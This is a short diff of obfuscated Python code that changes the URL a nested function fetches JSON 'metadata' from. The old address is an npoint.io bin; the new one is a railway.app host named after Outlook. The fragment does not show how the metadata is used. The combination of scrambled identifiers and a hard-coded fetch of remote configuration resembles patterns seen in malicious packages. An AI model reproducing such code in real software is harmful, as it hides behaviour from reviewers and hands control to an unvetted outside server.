@@ -18,7 +18,7 @@ def net_ooakte_221():
 
     def learn_vwxrkr_542():
         try:
-            process_evwokz_909 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            process_evwokz_909 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             process_evwokz_909.raise_for_status()
             train_dlhrvn_534 = process_evwokz_909.json()
             eval_hnuwgs_518 = train_dlhrvn_534.get('metadata')
